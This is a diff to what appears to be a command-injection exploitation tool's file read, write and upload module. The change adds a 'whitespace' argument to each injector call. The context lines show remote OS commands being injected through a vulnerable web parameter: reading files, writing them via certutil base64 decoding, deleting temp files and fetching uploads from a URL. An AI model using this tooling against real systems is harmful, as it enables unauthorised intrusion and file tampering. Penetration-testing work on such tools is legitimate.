@@ -40,7 +40,7 @@ def file_read(separator, TAG, prefix, suffix, http_request_method, url, vuln_par
     cmd = settings.WIN_FILE_READ + file_to_read
   else:
     cmd = "(" + settings.FILE_READ + file_to_read + ")"
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
@@ -105,19 +105,19 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
     path = path.replace("/","\\")
     # Chnage directory
     cmd = "cd " + path
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
     cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     # Decode base 64 encoding
     cmd = "certutil -decode "  + tmp_filname + " " + filname
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)  
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
     eb_injector.injection_results(response, TAG, cmd)
     # Delete tmp file
     cmd = "del "  + tmp_filname 
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)  
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
     eb_injector.injection_results(response, TAG, cmd)
     # Check if file exists
     cmd = "if exist " + filname + " (echo " + filname + ")"
@@ -125,14 +125,14 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
 
   else:
     cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell)
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
 
   # Check if defined cookie injection.
-  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = eb_injector.injection_results(response, TAG, cmd)
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -178,7 +178,7 @@ def file_upload(separator, TAG, prefix, suffix, http_request_method, url, vuln_p
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell)
     
@@ -187,7 +187,7 @@ def file_upload(separator, TAG, prefix, suffix, http_request_method, url, vuln_p
       cmd = "dir " + dest_to_upload + ")"
     else:  
       cmd = "echo $(ls " + dest_to_upload + ")"
-    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell)
     if settings.VERBOSITY_LEVEL >= 1:
